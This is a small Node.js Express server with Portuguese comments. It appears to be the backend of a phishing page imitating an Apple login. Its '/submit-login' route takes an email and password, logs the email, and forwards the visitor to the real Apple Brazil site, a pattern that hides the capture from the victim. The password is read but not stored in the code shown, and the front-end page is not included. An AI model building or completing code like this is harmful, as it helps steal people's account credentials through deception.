const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static('.'));

// Rota para processar login
app.post('/submit-login', (req, res) => {
    const { email, senha } = req.body;
    console.log('📧 Login attempt:', email);
    res.redirect('https://www.apple.com/br/');
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Servidor rodando na porta ${PORT}`);
});
